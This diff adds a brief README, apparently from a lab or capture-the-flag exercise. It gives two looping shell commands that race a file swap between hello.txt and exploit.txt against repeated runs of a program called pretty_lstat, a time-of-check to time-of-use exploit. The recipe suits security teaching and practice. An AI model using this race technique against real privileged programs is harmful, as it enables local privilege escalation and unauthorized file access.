@@ -1,0 +1,7 @@
+#pretty_lstat
+
+In two terminal windows:
+
+while true; do cp hello.txt data.txt; cp exploit.txt data.txt; done
+
+while true; do ./pretty_lstat data.txt; done
